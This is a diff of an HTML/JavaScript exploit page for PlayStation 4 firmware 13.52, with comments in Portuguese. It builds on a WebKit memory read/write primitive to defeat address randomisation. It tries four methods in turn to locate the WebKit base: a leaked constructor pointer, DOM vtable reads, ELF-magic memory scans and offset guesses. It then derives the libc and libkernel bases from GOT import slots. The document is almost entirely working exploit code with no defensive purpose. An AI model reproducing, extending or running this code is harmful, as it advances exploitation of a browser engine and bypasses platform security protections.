@@ -3,21 +3,22 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>PS4 13.52 — ELF Parser Base Resolver</title>
+<title>PS4 13.52 — Multi-Method Base Resolver</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 monospace;min-height:100vh;
   display:flex;flex-direction:column;align-items:center;padding:20px}
-h1{font-size:16px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;margin-bottom:8px}
-#fw{font-size:11px;color:#555;margin-bottom:16px}
-#con{width:100%;max-width:720px;height:480px;background:#050508;border:1px solid #1a1d2e;
-  border-radius:6px;overflow-y:auto;padding:10px 12px;font-size:11px;line-height:1.6}
+h1{font-size:15px;color:#00c8ff;letter-spacing:2px;text-transform:uppercase;margin-bottom:6px}
+#fw{font-size:11px;color:#555;margin-bottom:14px}
+#con{width:100%;max-width:760px;height:520px;background:#050508;border:1px solid #1a1d2e;
+  border-radius:6px;overflow-y:auto;padding:10px 12px;font-size:11px;line-height:1.55}
 .i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}
 .e{color:#ff5252;font-weight:bold}.s{color:#00c8ff;border-top:1px solid #1a1d2e;margin-top:4px;padding-top:4px}
+.d{color:#777}
 </style>
 </head>
 <body>
-<h1>PS4 13.52 — ELF Parser Base Resolver</h1>
+<h1>PS4 13.52 — Multi-Method Base Resolver</h1>
 <div id="fw">detectando...</div>
 <div id="con"></div>
 <script src="./13.52.js"></script>
@@ -34,28 +35,25 @@ function log(m, c='i') {
   const d = document.createElement('div'); d.className = c;
   d.textContent = m; $con.appendChild(d);
   $con.scrollTop = $con.scrollHeight;
-  while ($con.children.length > 300) $con.removeChild($con.firstChild);
+  while ($con.children.length > 400) $con.removeChild($con.firstChild);
 }
 function logH(m) { log('=== ' + m + ' ===', 's'); }
 
-// ── fix API ──
 function fixApi(p) {
   if (!p.read4 && p.read32) p.read4 = p.read32;
   if (!p.read8 && p.read64) p.read8 = p.read64;
   if (!p.write4 && p.write32) p.write4 = p.write32;
   if (!p.write8 && p.write64) p.write8 = p.write64;
-  // read1 via read4
   if (!p.read1) p.read1 = function(a) { return this.read4(a) & 0xFF; };
+  if (!p.leakval) p.leakval = function(v) { /* fallback */ return null; };
   return p;
 }
 
-// ── read helpers ──
-function read1(p, addr) { return p.read4(addr) & 0xFF; }
-function read2(p, addr) { return p.read4(addr) & 0xFFFF; }
-function read4(p, addr) { return p.read4(addr); }
-function read8(p, addr) { return p.read8(addr); }
+function read1(p, a) { return p.read4(a) & 0xFF; }
+function read2(p, a) { return p.read4(a) & 0xFFFF; }
+function read4(p, a) { return p.read4(a); }
+function read8(p, a) { return p.read8(a); }
 
-// ── int64 helpers ──
 function addrAdd(a, off) {
   if (typeof off === 'number') return a.add32(off);
   return a.add32(off.low !== undefined ? off.low : off);
@@ -65,219 +63,271 @@ function addrSub(a, off) {
   return a.sub32(off.low !== undefined ? off.low : off);
 }
 
-// ── resolve WebKit base ──
-function resolveWebkitBase() {
+// ═════════════════════════════════════════════════════════════════════════════
+// MÉTODO 1: __ps5NativeCtor
+// ═════════════════════════════════════════════════════════════════════════════
+function method1_nativeCtor() {
+  logH('METODO 1: __ps5NativeCtor');
   const ctor = globalThis.__ps5NativeCtor;
+  log('    __ps5NativeCtor = ' + ctor + ' (type=' + typeof ctor + ')');
+
   if (typeof ctor !== 'number' || ctor <= 0x100000000) {
-    throw new Error('__ps5NativeCtor invalido: ' + ctor);
+    log('    [-] __ps5NativeCtor invalido ou nao capturado', 'w');
+    return null;
   }
+
   const hi = Math.floor(ctor / 0x100000000);
   const lo = ctor - hi * 0x100000000;
   const ctor64 = new int64(lo >>> 0, hi >>> 0);
+  log('    ctor64 = 0x' + ctor64.toString(16));
+
   const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
              ? OFFSET_wk_host_constructor_candidates[0] : 0x36F9E20;
+  log('    host_constructor offset = 0x' + hc.toString(16));
+
   const baseVal = ctor - hc;
   const bHi = Math.floor(baseVal / 0x100000000);
   const bLo = baseVal - bHi * 0x100000000;
-  const webkitBase = new int64(bLo >>> 0, bHi >>> 0);
-  log('[+] __ps5NativeCtor = 0x' + ctor64.toString(16));
-  log('[+] WebKit Base     = 0x' + webkitBase.toString(16));
-  return webkitBase;
+  const base = new int64(bLo >>> 0, bHi >>> 0);
+  log('    candidato base = 0x' + base.toString(16));
+  return base;
 }
 
 // ═════════════════════════════════════════════════════════════════════════════
-// ELF64 PARSING NA MEMÓRIA
+// MÉTODO 2: Vtable de objeto DOM
 // ═════════════════════════════════════════════════════════════════════════════
+function method2_vtable(p) {
+  logH('METODO 2: Vtable de objeto DOM');
 
-function parseElf(p, base) {
-  logH('PARSING ELF64 DO WEBKIT');
-
-  // ELF header
-  const magic = read4(p, base);
-  if (magic !== 0x464C457F) {
-    log('[-] ELF magic invalido: 0x' + magic.toString(16), 'e');
-    return null;
-  }
-  log('[+] ELF magic OK');
-
-  const ei_class = read1(p, addrAdd(base, 4));
-  const ei_data = read1(p, addrAdd(base, 5));
-  log('    ei_class=' + ei_class + ' ei_data=' + ei_data + ' (1=LSB, 2=MSB)');
-
-  if (ei_class !== 2) {
-    log('[-] Nao e ELF64 (class=' + ei_class + ')', 'e');
+  if (!p.leakval) {
+    log('    [-] p.leakval nao disponivel', 'w');
     return null;
   }
 
-  // e_phoff @ offset 0x20 (8 bytes)
-  const phoff_lo = read4(p, addrAdd(base, 0x20));
-  const phoff_hi = read4(p, addrAdd(base, 0x24));
-  const phoff = new int64(phoff_lo, phoff_hi);
-  // e_phnum @ offset 0x38 (2 bytes)
-  const phnum = read2(p, addrAdd(base, 0x38));
-  log('[+] phoff=0x' + phoff.toString(16) + ' phnum=' + phnum);
+  try {
+    // Criar um textarea e pegar seu vtable
+    const ta = document.createElement('textarea');
+    const taCell = p.leakval(ta);
+    log('    textarea cell = 0x' + taCell.toString(16));
 
-  // ── Procurar PT_DYNAMIC ──
-  let dynamicVaddr = null;
-  let dynamicFilesz = 0;
-  let dynamicMemsz = 0;
+    // No JSC, objeto JSWrapper tem:
+    // cell[0] = JSCell header
+    // cell[1] = butterfly (ou nullptr)
+    // cell[2] = vtable ptr (para C++ object)
+    // Mas o layout exato depende da versao do WebKit
 
-  for (let i = 0; i < phnum; i++) {
-    const phAddr = addrAdd(base, phoff.low + i * 0x38);
-    const p_type = read4(p, phAddr);
-    if (p_type === 2) { // PT_DYNAMIC
-      const p_vaddr_lo = read4(p, addrAdd(phAddr, 0x10));
-      const p_vaddr_hi = read4(p, addrAdd(phAddr, 0x14));
-      dynamicVaddr = new int64(p_vaddr_lo, p_vaddr_hi);
-      const p_filesz_lo = read4(p, addrAdd(phAddr, 0x20));
-      const p_filesz_hi = read4(p, addrAdd(phAddr, 0x24));
-      dynamicFilesz = p_filesz_lo; // assume <4GB
-      const p_memsz_lo = read4(p, addrAdd(phAddr, 0x28));
-      const p_memsz_hi = read4(p, addrAdd(phAddr, 0x2C));
-      dynamicMemsz = p_memsz_lo;
-      log('[+] PT_DYNAMIC #' + i + ' vaddr=0x' + dynamicVaddr.toString(16) +
-          ' filesz=0x' + dynamicFilesz.toString(16) + ' memsz=0x' + dynamicMemsz.toString(16));
-      break;
-    }
-  }
+    // Tentar ler o que parece ser um ponteiro no cell
+    const ptr0 = read8(p, taCell);
+    const ptr1 = read8(p, addrAdd(taCell, 8));
+    const ptr2 = read8(p, addrAdd(taCell, 16));
+    const ptr3 = read8(p, addrAdd(taCell, 24));
 
-  if (!dynamicVaddr) {
-    log('[-] PT_DYNAMIC nao encontrado', 'e');
-    return null;
-  }
+    log('    cell[0x00] = 0x' + ptr0.toString(16));
+    log('    cell[0x08] = 0x' + ptr1.toString(16));
+    log('    cell[0x10] = 0x' + ptr2.toString(16));
+    log('    cell[0x18] = 0x' + ptr3.toString(16));
 
-  // O p_vaddr em PHDR e relativo ao base do modulo? No ELF executavel,
-  // p_vaddr e o endereco virtual absoluto (ou relativo ao base de carga).
-  // No PS4, os modulos sao ET_DYN (PIE), entao p_vaddr e relativo a base.
-  const dynamicAddr = addrAdd(base, dynamicVaddr.low);
-  log('[+] Dynamic section @ 0x' + dynamicAddr.toString(16));
-
-  // ── Parse dynamic entries ──
-  let strtab = null;
-  let symtab = null;
-  let jmprel = null;
-  let pltrelsz = 0;
-  let rela = null;
-  let relasz = 0;
-  let pltgot = null;
-
-  const numDyn = Math.floor(dynamicMemsz / 16);
-  log('[+] Varrendo ' + numDyn + ' entradas dynamic...');
-
-  for (let i = 0; i < numDyn; i++) {
-    const entry = addrAdd(dynamicAddr, i * 16);
-    const tag_lo = read4(p, entry);
-    const tag_hi = read4(p, addrAdd(entry, 4));
-    const val_lo = read4(p, addrAdd(entry, 8));
-    const val_hi = read4(p, addrAdd(entry, 12));
-    const tag = new int64(tag_lo, tag_hi);
-    const val = new int64(val_lo, val_hi);
-
-    if (tag.low === 0 && tag.hi === 0) break; // DT_NULL
-    if (tag.low === 5)  { strtab = val; log('    DT_STRTAB  = 0x' + val.toString(16)); }
-    if (tag.low === 6)  { symtab = val; log('    DT_SYMTAB  = 0x' + val.toString(16)); }
-    if (tag.low === 23) { jmprel = val; log('    DT_JMPREL  = 0x' + val.toString(16)); }
-    if (tag.low === 2)  { pltrelsz = val.low; log('    DT_PLTRELSZ= ' + val.low); }
-    if (tag.low === 17) { rela = val; log('    DT_RELA    = 0x' + val.toString(16)); }
-    if (tag.low === 18) { relasz = val.low; log('    DT_RELASZ  = ' + val.low); }
-    if (tag.low === 3)  { pltgot = val; log('    DT_PLTGOT  = 0x' + val.toString(16)); }
-  }
-
-  if (!strtab || !symtab || !jmprel) {
-    log('[-] Tabelas dinamicas incompletas', 'e');
-    return null;
-  }
-
-  // No ELF PIE, os enderecos nas entradas dynamic sao relativos a base
-  const strtabAddr = addrAdd(base, strtab.low);
-  const symtabAddr = addrAdd(base, symtab.low);
-  const jmprelAddr = addrAdd(base, jmprel.low);
-  const pltgotAddr = pltgot ? addrAdd(base, pltgot.low) : null;
-
-  log('[+] strtab @ 0x' + strtabAddr.toString(16));
-  log('[+] symtab @ 0x' + symtabAddr.toString(16));
-  log('[+] jmprel @ 0x' + jmprelAddr.toString(16));
-  if (pltgotAddr) log('[+] pltgot @ 0x' + pltgotAddr.toString(16));
-
-  return {
-    base, strtabAddr, symtabAddr, jmprelAddr, pltrelsz,
-    pltgotAddr, relaAddr: rela ? addrAdd(base, rela.low) : null, relasz
-  };
-}
-
-// ── ler string da strtab ──
-function readString(p, strtabAddr, offset, maxLen=256) {
-  let s = '';
-  for (let i = 0; i < maxLen; i++) {
-    const ch = read1(p, addrAdd(strtabAddr, offset + i));
-    if (ch === 0) break;
-    s += String.fromCharCode(ch);
-  }
-  return s;
-}
-
-// ── varrer RELA e achar imports ──
-function scanImports(p, elf) {
-  logH('SCANNING IMPORTS (RELA.PLTT)');
-  const numRela = Math.floor(elf.pltrelsz / 24);
-  log('[+] ' + numRela + ' entradas RELA na .rela.plt');
-
-  const targets = ['memset','memcpy','strcmp','strlen','pthread_create',
-    '__stack_chk_guard','sceKernelDlsym','sceKernelSendNotificationRequest',
-    'sceKernelGetpid','sceKernelUsleep','scePthreadCreate','sceKernelGetCurrentCpu',
-    'sceKernelSendNotificationRequest'];
-  const found = {};
-
-  for (let i = 0; i < numRela; i++) {
-    const rela = addrAdd(elf.jmprelAddr, i * 24);
-    const r_offset_lo = read4(p, rela);
-    const r_offset_hi = read4(p, addrAdd(rela, 4));
-    const r_offset = new int64(r_offset_lo, r_offset_hi);
-    const r_info_lo = read4(p, addrAdd(rela, 8));
-    const r_info_hi = read4(p, addrAdd(rela, 12));
-    const r_info = new int64(r_info_lo, r_info_hi);
-    const symIdx = r_info.low >>> 0; // ELF64_R_SYM = r_info >> 32
-    // ELF64_R_SYM = r_info >> 32
-    const symIdx2 = (r_info.hi >>> 0); // bits 32-63
-    // Na verdade: r_info e um uint64. sym = r_info >> 32.
-    // Como int64 tem .low (32 bits) e .hi (32 bits), sym = r_info.hi (se r_info for armazenado como little-endian)
-    // Mas depende da implementacao do int64. Vamos usar o valor raw.
-    const sym = (r_info.hi >>> 0); // assume little-endian
-
-    // Ler st_name do simbolo
-    const symEntry = addrAdd(elf.symtabAddr, sym * 24);
-    const st_name = read4(p, symEntry);
-    const name = readString(p, elf.strtabAddr, st_name);
-
-    if (name.length > 0 && targets.indexOf(name) >= 0) {
-      // r_offset e o endereco do GOT slot (relativo a base? ou absoluto?)
-      // No ELF ET_DYN, r_offset e relativo a base
-      const gotSlot = addrAdd(elf.base, r_offset.low);
-      const gotValue = read8(p, gotSlot);
-      found[name] = { gotSlot, gotValue, sym };
-      log('[+] ' + name + '  GOT@0x' + gotSlot.toString(16) + ' = 0x' + gotValue.toString(16));
-    }
-  }
-
-  log('[+] ' + Object.keys(found).length + ' imports uteis encontrados');
-  return found;
-}
-
-// ── encontrar base de um modulo varrendo para tras ──
-function findElfBase(p, ptr, maxBack) {
-  // ptr deve ser um int64
-  for (let back = 0; back < maxBack; back += 0x1000) {
-    try {
-      const test = addrSub(ptr, back);
-      if (read4(p, test) === 0x464C457F) {
-        return test;
+    // Procurar por ponteiro que pareca estar na regiao do WebKit
+    // (hi = 0x00000000 ou 0xFFFFFFFF para userland PS4)
+    const candidates = [ptr0, ptr1, ptr2, ptr3];
+    for (let i = 0; i < candidates.length; i++) {
+      const ptr = candidates[i];
+      if (ptr.hi === 0 || ptr.hi === -1) {
+        // Pode ser um ponteiro valido
+        // Tentar ler como se fosse vtable
+        try {
+          const vt0 = read8(p, ptr);
+          log('    cell[' + (i*8) + '] -> read8(0x' + ptr.toString(16) + ') = 0x' + vt0.toString(16));
+          if (vt0.hi === 0 || vt0.hi === -1) {
+            // Pode ser vtable -> primeiro elemento
+            // No slopkit, vtable_first_element é usado para achar base
+            // Se tivermos OFFSET_wk_vtable_first_element, podemos usar
+            if (typeof OFFSET_wk_vtable_first_element !== 'undefined' && OFFSET_wk_vtable_first_element !== 0) {
+              const base = addrSub(vt0, OFFSET_wk_vtable_first_element);
+              log('    base via vtable = 0x' + base.toString(16));
+              return base;
+            }
+          }
+        } catch(e) {}
       }
-    } catch(e) {}
+    }
+    log('    [-] Nao conseguiu extrair base do vtable', 'w');
+  } catch (e) {
+    log('    [-] Erro: ' + (e.message || e), 'e');
   }
   return null;
 }
 
-// ── main ──
+// ═════════════════════════════════════════════════════════════════════════════
+// MÉTODO 3: Procurar ELF magic na memoria (scan)
+// ═════════════════════════════════════════════════════════════════════════════
+function method3_scan(p) {
+  logH('METODO 3: Scan por ELF magic na memoria');
+
+  // No PS4, o WebKit e geralmente mapeado em uma regiao alta
+  // Vamos tentar achar o ELF magic varrendo uma regiao plausivel
+  // Comecando de um endereco alto e descendo
+
+  // Tentar primeiro com o candidato do metodo 1, mas varrendo ao redor
+  const ctor = globalThis.__ps5NativeCtor;
+  if (typeof ctor === 'number' && ctor > 0x100000000) {
+    const hi = Math.floor(ctor / 0x100000000);
+    const lo = ctor - hi * 0x100000000;
+    const ctor64 = new int64(lo >>> 0, hi >>> 0);
+
+    // Varredura em torno do ctor (±16MB)
+    log('    Varrendo em torno de __ps5NativeCtor (0x' + ctor64.toString(16) + ')...');
+    for (let back = 0; back < 0x2000000; back += 0x1000) {
+      try {
+        const test = addrSub(ctor64, back);
+        if (read4(p, test) === 0x464C457F) {
+          log('    [+] ELF magic encontrado @ 0x' + test.toString(16) + ' (back=0x' + back.toString(16) + ')', 'ok');
+          return test;
+        }
+      } catch(e) {}
+    }
+  }
+
+  // Se nao achou, tentar varrer desde um endereco fixo alto
+  // No PS4, modulos userland geralmente comecam em 0x800000000
+  log('    Varrendo desde 0x800000000...');
+  const start = new int64(0, 0x80); // 0x800000000
+  for (let off = 0; off < 0x10000000; off += 0x1000) {
+    try {
+      const test = addrAdd(start, off);
+      if (read4(p, test) === 0x464C457F) {
+        log('    [+] ELF magic @ 0x' + test.toString(16), 'ok');
+        return test;
+      }
+    } catch(e) {}
+  }
+
+  log('    [-] Nao encontrou ELF magic', 'e');
+  return null;
+}
+
+// ═════════════════════════════════════════════════════════════════════════════
+// MÉTODO 4: Usar p.read8 em enderecos conhecidos do WebKit
+// ═════════════════════════════════════════════════════════════════════════════
+function method4_knownRegions(p) {
+  logH('METODO 4: Testar regioes conhecidas do WebKit');
+
+  // No PS4, o WebKit pode estar em enderecos como:
+  // 0x800000000, 0x80a000000, etc.
+  // Vamos tentar alguns candidatos baseados no __ps5NativeCtor
+
+  const ctor = globalThis.__ps5NativeCtor;
+  if (typeof ctor !== 'number' || ctor <= 0x100000000) {
+    log('    [-] __ps5NativeCtor nao disponivel', 'w');
+    return null;
+  }
+
+  // O ctor esta a ~55.5MB do inicio do WebKit
+  // Mas talvez o modulo seja maior no PS4
+  // Tentar subtrair multiplos do tamanho do modulo
+
+  const sizes = [
+    0x36F9E20,   // 55.5 MB (PS5)
+    0x3700000,   // 55.8 MB
+    0x3800000,   // 56 MB
+    0x4000000,   // 64 MB
+    0x4500000,   // 69 MB
+    0x5000000,   // 80 MB
+  ];
+
+  const hi = Math.floor(ctor / 0x100000000);
+  const lo = ctor - hi * 0x100000000;
+  const ctor64 = new int64(lo >>> 0, hi >>> 0);
+
+  for (const size of sizes) {
+    try {
+      const base = addrSub(ctor64, size);
+      const magic = read4(p, base);
+      log('    ctor - 0x' + size.toString(16) + ' = 0x' + base.toString(16) + ' -> magic=0x' + magic.toString(16));
+      if (magic === 0x464C457F) {
+        log('    [+] ELF magic encontrado!', 'ok');
+        return base;
+      }
+    } catch(e) {
+      log('    ctor - 0x' + size.toString(16) + ' -> crash na leitura', 'd');
+    }
+  }
+
+  log('    [-] Nenhum candidato funcionou', 'w');
+  return null;
+}
+
+// ═════════════════════════════════════════════════════════════════════════════
+// VALIDAR BASE
+// ═════════════════════════════════════════════════════════════════════════════
+function validateBase(p, base, name) {
+  if (!base) return false;
+  try {
+    const magic = read4(p, base);
+    const ok = (magic === 0x464C457F);
+    log('    [' + (ok ? '+' : '-') + '] ' + name + ' @ 0x' + base.toString(16) + ' magic=0x' + magic.toString(16) + (ok ? ' (ELF OK)' : ' (INVALIDO)'), ok ? 'ok' : 'e');
+    return ok;
+  } catch(e) {
+    log('    [-] ' + name + ' @ 0x' + base.toString(16) + ' -> crash: ' + (e.message || e), 'e');
+    return false;
+  }
+}
+
+// ═════════════════════════════════════════════════════════════════════════════
+// RESOLVER BASES VIA IMPORTS (usando base validada)
+// ═════════════════════════════════════════════════════════════════════════════
+function resolveViaImports(p, webkitBase) {
+  logH('RESOLVENDO BASES VIA IMPORTS (offsets estaticos)');
+
+  let libcBase = null;
+  let libkernelBase = null;
+
+  // libc
+  if (OFFSET_wk_memset_import && OFFSET_lc_memset) {
+    try {
+      const slot = addrAdd(webkitBase, OFFSET_wk_memset_import);
+      const ptr = read8(p, slot);
+      log('    GOT memset @ wk+0x' + OFFSET_wk_memset_import.toString(16) + ' = 0x' + ptr.toString(16));
+      libcBase = addrSub(ptr, OFFSET_lc_memset);
+      log('    libcBase = 0x' + libcBase.toString(16));
+      if (validateBase(p, libcBase, 'libcBase')) {
+        // ok
+      } else {
+        libcBase = null;
+      }
+    } catch(e) {
+      log('    [-] Erro libc: ' + (e.message || e), 'e');
+    }
+  } else {
+    log('    [!] OFFSET_wk_memset_import ou OFFSET_lc_memset = 0', 'w');
+  }
+
+  // libkernel
+  if (OFFSET_wk___stack_chk_guard_import && OFFSET_lk___stack_chk_guard) {
+    try {
+      const slot = addrAdd(webkitBase, OFFSET_wk___stack_chk_guard_import);
+      const ptr = read8(p, slot);
+      log('    GOT guard @ wk+0x' + OFFSET_wk___stack_chk_guard_import.toString(16) + ' = 0x' + ptr.toString(16));
+      libkernelBase = addrSub(ptr, OFFSET_lk___stack_chk_guard);
+      log('    libkernelBase = 0x' + libkernelBase.toString(16));
+      if (validateBase(p, libkernelBase, 'libkernelBase')) {
+        // ok
+      } else {
+        libkernelBase = null;
+      }
+    } catch(e) {
+      log('    [-] Erro libkernel: ' + (e.message || e), 'e');
+    }
+  } else {
+    log('    [!] OFFSET_wk___stack_chk_guard_import ou OFFSET_lk___stack_chk_guard = 0', 'w');
+  }
+
+  return { libcBase, libkernelBase };
+}
+
+// ═════════════════════════════════════════════════════════════════════════════
+// MAIN
+// ═════════════════════════════════════════════════════════════════════════════
 async function main() {
   const ua = navigator.userAgent;
   const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
@@ -303,66 +353,72 @@ async function main() {
   }
   log('[+] mem.js OK', 'ok');
 
-  logH('STAGE 3: WEBKIT BASE');
-  let webkitBase;
+  // Teste basico de R/W
+  logH('TESTE BASICO DE R/W');
   try {
-    webkitBase = resolveWebkitBase();
-  } catch (e) {
-    log('[-] ' + e.message, 'e'); return;
+    const testAddr = new int64(0, 0); // null pointer - vai crashar se R/W nao funcionar
+    // Na verdade, ler de null vai crashar. Vamos ler de um endereco do proprio JS heap
+    // usando leakval
+    if (p.leakval) {
+      const testObj = {};
+      const leaked = p.leakval(testObj);
+      log('    leakval({}) = 0x' + leaked.toString(16));
+      const val = read8(p, leaked);
+      log('    read8(leaked) = 0x' + val.toString(16) + ' (R/W funciona!)', 'ok');
+    } else {
+      log('    [!] p.leakval nao disponivel', 'w');
+    }
+  } catch(e) {
+    log('    [-] Teste R/W falhou: ' + (e.message || e), 'e');
   }
 
-  // Verificar ELF magic na base
-  const magic = read4(p, webkitBase);
-  log('[+] read4(webkitBase) = 0x' + magic.toString(16) +
-      (magic === 0x464C457F ? ' (ELF OK)' : ' (ERRO!)'));
+  logH('STAGE 3: RESOLVENDO WEBKIT BASE');
 
-  logH('STAGE 4: PARSE ELF & FIND IMPORTS');
-  const elf = parseElf(p, webkitBase);
-  if (!elf) {
-    log('[-] Falha no parse ELF', 'e');
+  let webkitBase = null;
+  let method = '';
+
+  // Tentar metodo 1
+  const m1 = method1_nativeCtor();
+  if (m1 && validateBase(p, m1, 'Metodo 1')) {
+    webkitBase = m1; method = 'nativeCtor';
+  }
+
+  // Tentar metodo 2
+  if (!webkitBase) {
+    const m2 = method2_vtable(p);
+    if (m2 && validateBase(p, m2, 'Metodo 2')) {
+      webkitBase = m2; method = 'vtable';
+    }
+  }
+
+  // Tentar metodo 4 (variacoes de offset)
+  if (!webkitBase) {
+    const m4 = method4_knownRegions(p);
+    if (m4 && validateBase(p, m4, 'Metodo 4')) {
+      webkitBase = m4; method = 'knownRegions';
+    }
+  }
+
+  // Tentar metodo 3 (scan completo)
+  if (!webkitBase) {
+    const m3 = method3_scan(p);
+    if (m3 && validateBase(p, m3, 'Metodo 3')) {
+      webkitBase = m3; method = 'scan';
+    }
+  }
+
+  if (!webkitBase) {
+    log('[-] ===== NENHUM METODO FUNCIONOU =====', 'e');
     return;
   }
 
-  const imports = scanImports(p, elf);
+  log('[+] WebKit Base = 0x' + webkitBase.toString(16) + ' (via ' + method + ')', 'ok');
 
-  logH('STAGE 5: RESOLVENDO BASES');
-  let libcBase = null;
-  let libkernelBase = null;
+  logH('STAGE 4: RESOLVENDO OUTRAS BASES');
+  const { libcBase, libkernelBase } = resolveViaImports(p, webkitBase);
 
-  // libc via memset
-  if (imports['memset']) {
-    const ptr = imports['memset'].gotValue;
-    log('[+] memset @ 0x' + ptr.toString(16));
-    libcBase = findElfBase(p, ptr, 0x400000);
-    if (libcBase) {
-      log('[+] libcBase = 0x' + libcBase.toString(16), 'ok');
-    } else {
-      log('[-] Nao encontrou base libc', 'w');
-    }
-  }
-
-  // libkernel via __stack_chk_guard
-  if (imports['__stack_chk_guard']) {
-    const ptr = imports['__stack_chk_guard'].gotValue;
-    log('[+] __stack_chk_guard @ 0x' + ptr.toString(16));
-    libkernelBase = findElfBase(p, ptr, 0x400000);
-    if (libkernelBase) {
-      log('[+] libkernelBase = 0x' + libkernelBase.toString(16), 'ok');
-    } else {
-      log('[-] Nao encontrou base libkernel', 'w');
-    }
-  }
-
-  // fallback: sceKernelGetpid
-  if (!libkernelBase && imports['sceKernelGetpid']) {
-    const ptr = imports['sceKernelGetpid'].gotValue;
-    log('[+] sceKernelGetpid @ 0x' + ptr.toString(16) + ' (fallback)');
-    libkernelBase = findElfBase(p, ptr, 0x400000);
-    if (libkernelBase) log('[+] libkernelBase (fb) = 0x' + libkernelBase.toString(16), 'ok');
-  }
-
-  logH('RESULTADO');
-  log('WebKit Base     = 0x' + webkitBase.toString(16));
+  logH('RESULTADO FINAL');
+  log('WebKit Base     = 0x' + webkitBase.toString(16) + ' (' + method + ')');
   log('libkernel Base  = ' + (libkernelBase ? '0x' + libkernelBase.toString(16) : 'FALHOU'));
   log('libSceLibc Base = ' + (libcBase ? '0x' + libcBase.toString(16) : 'FALHOU'));
 
